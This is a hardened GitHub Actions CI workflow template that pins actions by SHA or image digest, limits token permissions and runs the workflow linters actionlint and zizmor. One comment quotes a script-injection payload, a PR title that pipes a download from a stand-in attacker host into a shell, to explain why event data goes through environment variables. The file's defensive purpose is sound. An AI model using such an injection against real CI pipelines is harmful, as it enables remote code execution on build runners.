# Starter CI workflow — the hardening from skills/ci-actions/SKILL.md, already wired.
#
# BEFORE USING: every `uses:` below carries a placeholder instead of a real pin. That is deliberate
# — a template cannot ship a pin that is both real and current, and a stale-but-valid pin is the
# failure mode this file exists to prevent: it would run *some* version silently. An invalid ref
# fails loudly on the first run instead.
#
# There are TWO kinds of placeholder, because the ref after `@` means different things:
#
#   REPLACE_WITH_SHA           — a GitHub Action, pinned to a 40-char GIT COMMIT SHA:
#       gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq .object.sha
#       (or `git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2`)
#
#   REPLACE_WITH_IMAGE_DIGEST  — a `docker://` step, pinned to an IMAGE MANIFEST DIGEST resolved by
#                                the registry, written in full as `sha256:...`:
#       docker buildx imagetools inspect rhysd/actionlint:v1.7.4 --format '{{.Manifest.Digest}}'
#       (without a Docker toolchain: `skopeo inspect --format '{{.Digest}}'
#        docker://rhysd/actionlint:v1.7.4`)
#
# A commit SHA on a `docker://` line is an image reference that does not exist, so the job never
# starts. Keep the trailing version comment so the next reader knows which release was pinned.
#
#   REPLACE_WITH_VERSION       — a tool fetched at run time (`pipx run zizmor==1.2.3`). Not a pin
#                                by SHA, but a pin: an unpinned `pipx run` fetches whatever PyPI
#                                serves that morning, inside the job that exists to catch exactly
#                                that. Pick a reviewed version.
name: CI

on:
  push:
    branches: [main]
  pull_request:

# Least privilege at the top; widen per job only where a job genuinely needs it.
# Without this block the workflow inherits the repository default, which may be write-all.
permissions:
  contents: read

# One run per ref: a busy branch cancels its own superseded runs instead of queueing them.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-24.04        # fixes the OS release; hosted image software still updates
    timeout-minutes: 15          # a hung job otherwise holds a runner for hours
    steps:
      - uses: actions/checkout@REPLACE_WITH_SHA # v4.2.2
        with:
          persist-credentials: false   # don't leave a pushable token in .git/config

      - uses: actions/setup-python@REPLACE_WITH_SHA # v5.3.0
        with:
          python-version: "3.12"

      # Cache the dependency store, keyed on the lockfile — a key that ignores the lockfile
      # serves stale dependencies and the resulting failures look like flakiness.
      - uses: actions/cache@REPLACE_WITH_SHA # v4.1.2
        with:
          path: ~/.cache/pip
          key: pip-${{ runner.os }}-${{ hashFiles('**/requirements*.txt', '**/uv.lock') }}

      - name: Install
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      - name: Lint and formatting
        run: |
          ruff check .
          ruff format --check .

      - name: Test
        run: pytest -q

      # Untrusted event data crosses into the shell as an ENVIRONMENT VARIABLE, never as a
      # ${{ }} interpolation inside `run:`. A PR titled `$(curl attacker.example|sh)` executes
      # if interpolated; quoted "$PR_TITLE" is inert data.
      - name: Comment-safe use of event data
        if: github.event_name == 'pull_request'
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          printf 'building for PR: %s\n' "$PR_TITLE"

  # Workflow linting, including the security patterns this file demonstrates.
  workflow-lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@REPLACE_WITH_SHA # v4.2.2
        with:
          persist-credentials: false
      # A `docker://` step pins differently from a GitHub Action: the ref after `@` is an IMAGE
      # MANIFEST DIGEST (`sha256:...`), not a git commit SHA, so the SHA placeholder above is the
      # wrong kind of identifier here. Resolve it with:
      #   docker buildx imagetools inspect rhysd/actionlint:v1.7.4 --format '{{.Manifest.Digest}}'
      # then use `docker://rhysd/actionlint@sha256:<digest>`.
      - name: actionlint
        uses: docker://rhysd/actionlint@REPLACE_WITH_IMAGE_DIGEST # v1.7.4, as sha256:...
      # zizmor audits for the pwn-request, script-injection, and unpinned-action classes.
      # PIN IT: a bare `pipx run zizmor` resolves the newest PyPI release on every run, which is an
      # unpinned third-party executable in the job whose whole purpose is catching unpinned
      # dependencies. Choose a reviewed version and put it here.
      - name: zizmor
        run: pipx run zizmor==REPLACE_WITH_VERSION .github/workflows/
